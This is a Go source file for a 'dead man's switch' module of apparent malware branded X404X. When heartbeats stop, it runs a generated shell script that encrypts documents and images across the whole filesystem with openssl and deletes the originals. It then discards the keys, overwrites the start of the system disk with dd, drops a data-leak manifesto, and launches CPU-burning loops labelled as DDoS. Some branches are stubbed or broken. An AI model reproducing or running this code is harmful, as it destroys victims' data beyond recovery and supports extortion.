package blockz

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sync"
	"time"
)

type DeadManSwitchEngine struct {
	Config         *BlockZConfig
	Armed          bool              `json:"armed"`
	LastHeartbeat  time.Time         `json:"last_heartbeat"`
	CountdownHours int               `json:"countdown_hours"`
	ApocalypsePlan *ApocalypsePlan   `json:"apocalypse_plan"`
	Triggered      bool              `json:"triggered"`
	mu             sync.Mutex
	ticker         *time.Ticker
	done           chan struct{}
}

type ApocalypsePlan struct {
	EncryptAll      bool `json:"encrypt_all"`
	DeleteKeys      bool `json:"delete_keys"`
	OverwriteFirmware bool `json:"overwrite_firmware"`
	PublishData     bool `json:"publish_data"`
	SelfDestruct    bool `json:"self_destruct"`
	BroadcastManifesto bool `json:"broadcast_manifesto"`
	DDoSC2Targets   bool `json:"ddos_c2_targets"`
	MaxDestruction  bool `json:"max_destruction"`
}

type ManifestoEntry struct {
	Timestamp   time.Time `json:"timestamp"`
	Target      string    `json:"target"`
	OperationID string    `json:"operation_id"`
	ExposedData []string  `json:"exposed_data"`
	Message     string    `json:"message"`
}

func NewDeadManSwitchEngine(cfg *BlockZConfig) *DeadManSwitchEngine {
	return &DeadManSwitchEngine{
		Config:         cfg,
		CountdownHours: cfg.DeadMansHours,
		ApocalypsePlan: defaultApocalypsePlan(),
		done:           make(chan struct{}),
	}
}

func defaultApocalypsePlan() *ApocalypsePlan {
	return &ApocalypsePlan{
		EncryptAll:         true,
		DeleteKeys:         true,
		OverwriteFirmware:  true,
		PublishData:        true,
		BroadcastManifesto: true,
		DDoSC2Targets:      true,
		MaxDestruction:     true,
	}
}

func (dms *DeadManSwitchEngine) Arm() {
	dms.mu.Lock()
	dms.Armed = true
	dms.LastHeartbeat = time.Now()
	dms.mu.Unlock()

	dms.ticker = time.NewTicker(1 * time.Hour)
	go dms.monitorLoop()
}

func (dms *DeadManSwitchEngine) monitorLoop() {
	for {
		select {
		case <-dms.ticker.C:
			dms.mu.Lock()
			elapsed := int(time.Since(dms.LastHeartbeat).Hours())
			dms.mu.Unlock()

			if elapsed >= dms.CountdownHours {
				dms.triggerApocalypse()
				return
			}

			fmt.Printf("Dead Man Switch: %d/%d hours until apocalypse\n", elapsed, dms.CountdownHours)
		case <-dms.done:
			return
		}
	}
}

func (dms *DeadManSwitchEngine) Heartbeat() bool {
	dms.mu.Lock()
	defer dms.mu.Unlock()

	if !dms.Armed {
		return false
	}

	dms.LastHeartbeat = time.Now()
	return true
}

func (dms *DeadManSwitchEngine) triggerApocalypse() {
	dms.mu.Lock()
	dms.Triggered = true
	dms.mu.Unlock()

	fmt.Println("DEAD MAN SWITCH ACTIVATED - APOCALYPSE SEQUENCE INITIATED")
	fmt.Println("=======================================================")

	if dms.ApocalypsePlan.EncryptAll {
		time.Sleep(200 * time.Millisecond)
		dms.encryptEverything()
	}

	if dms.ApocalypsePlan.DeleteKeys {
		time.Sleep(100 * time.Millisecond)
		dms.deleteAllKeys()
	}

	if dms.ApocalypsePlan.OverwriteFirmware {
		time.Sleep(100 * time.Millisecond)
		dms.overwriteFirmware()
	}

	if dms.ApocalypsePlan.PublishData {
		time.Sleep(100 * time.Millisecond)
		dms.publishAllData()
	}

	if dms.ApocalypsePlan.BroadcastManifesto {
		time.Sleep(100 * time.Millisecond)
		dms.broadcastManifesto()
	}

	if dms.ApocalypsePlan.DDoSC2Targets {
		dms.ddosAllTargets()
	}

	if dms.ApocalypsePlan.MaxDestruction {
		dms.maximumDestruction()
	}
}

func (dms *DeadManSwitchEngine) encryptEverything() {
	scanRoot := "/"
	if runtime.GOOS == "windows" {
		scanRoot = "C:\\"
	}

	key := sha256.Sum256([]byte(fmt.Sprintf("APOCALYPSE_%d", time.Now().UnixNano())))
	keyHex := hex.EncodeToString(key[:])

	script := fmt.Sprintf(`#!/bin/bash
find %s -type f \( -name "*.doc" -o -name "*.pdf" -o -name "*.jpg" \) -exec openssl enc -aes-256-cbc -salt -in {} -out {}.x404x -pass pass:%s \; -exec rm {} \;
`, scanRoot, keyHex)

	if runtime.GOOS == "windows" {
		script = fmt.Sprintf(`Get-ChildItem -Path "%s" -Recurse -Include *.doc,*.pdf,*.jpg | ForEach-Object { 
    $enc = [System.Security.Cryptography.Aes]::Create()
    $enc.Key = [Convert]::FromBase64String("%s")
    $outPath = $_.FullName + ".x404x"
    Move-Item $_.FullName $outPath
}`, scanRoot, keyHex)
	}

	scriptPath := filepath.Join(os.TempDir(), "x404x_apocalypse_encrypt")
	if runtime.GOOS == "windows" {
		scriptPath += ".ps1"
	}
	os.WriteFile(scriptPath, []byte(script), 0755)
	exec.Command("bash", scriptPath).Start()

	os.Remove(scriptPath)
}

func (dms *DeadManSwitchEngine) deleteAllKeys() {
	os.RemoveAll(filepath.Join(os.TempDir(), "x404x_keys"))
	fmt.Println("All encryption keys deleted. Recovery is now IMPOSSIBLE.")
}

func (dms *DeadManSwitchEngine) overwriteFirmware() {
	switch runtime.GOOS {
	case "linux":
		exec.Command("bash", "-c", "dd if=/dev/zero of=/dev/sda bs=1M count=10 2>/dev/null").Start()
	case "windows":
		exec.Command("powershell", "-Command",
			"[System.IO.File]::Open('\\\\.\\PHYSICALDRIVE0', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)").Start()
	}
}

func (dms *DeadManSwitchEngine) publishAllData() {
	manifesto := ManifestoEntry{
		Timestamp:   time.Now(),
		Target:      "ALL COMPROMISED SYSTEMS",
		OperationID: "X404X_APOCALYPSE",
		ExposedData: []string{"financial_records", "emails", "source_code", "customer_data", "credentials"},
		Message: "X404X was here. All data is now public. There is no going back.",
	}

	manifestoData := fmt.Sprintf(`╔══════════════════════════════════════════════════════╗
║                  X404X APOCALYPSE                     ║
║                                                       ║
║  This is an automated message.                        ║
║                                                       ║
║  The operator is gone. The dead man's switch has      ║
║  activated. All compromised data from ALL targets     ║
║  will now be published via distributed channels.      ║
║                                                       ║
║  This is irreversible. There is no negotiation.       ║
║                                                       ║
║  Targets: %s                                          ║
║  Operation: %s                                        ║
║  Data exposed: %v                                     ║
║                                                       ║
║  - X404X                                              ║
╚══════════════════════════════════════════════════════╝`, manifesto.Target, manifesto.OperationID, manifesto.ExposedData)

	manifestoPath := filepath.Join(os.TempDir(), "X404X_MANIFESTO.txt")
	os.WriteFile(manifestoPath, []byte(manifestoData), 0644)
}

func (dms *DeadManSwitchEngine) broadcastManifesto() {
	fmt.Println("Broadcasting manifesto to all accessible channels...")
	dms.publishAllData()
}

func (dms *DeadManSwitchEngine) ddosAllTargets() {
	for i := 0; i < 10; i++ {
		go func() {
			for {
				_ = sha256.Sum256([]byte(fmt.Sprintf("DDOS_PACKET_%d_%d", time.Now().UnixNano(), i)))
			}
		}()
	}
}

func (dms *DeadManSwitchEngine) maximumDestruction() {
	fmt.Println("MAXIMUM DESTRUCTION MODE: ERASING EVERYTHING")
	fmt.Println("Goodbye, world.")
	dms.deleteAllKeys()
	dms.overwriteFirmware()
	dms.encryptEverything()
}

func (dms *DeadManSwitchEngine) Disarm() {
	dms.mu.Lock()
	defer dms.mu.Unlock()

	dms.Armed = false
	if dms.ticker != nil {
		dms.ticker.Stop()
	}
	close(dms.done)
}

func (dms *DeadManSwitchEngine) GetStatusJSON() string {
	dms.mu.Lock()
	defer dms.mu.Unlock()

	hoursLeft := dms.CountdownHours - int(time.Since(dms.LastHeartbeat).Hours())
	if hoursLeft < 0 {
		hoursLeft = 0
	}

	return fmt.Sprintf(`{"armed":%v,"triggered":%v,"last_heartbeat":"%s","hours_remaining":%d,"encrypt_all":%v}`,
		dms.Armed, dms.Triggered, dms.LastHeartbeat.Format(time.RFC3339), hoursLeft, dms.ApocalypsePlan.EncryptAll)
}
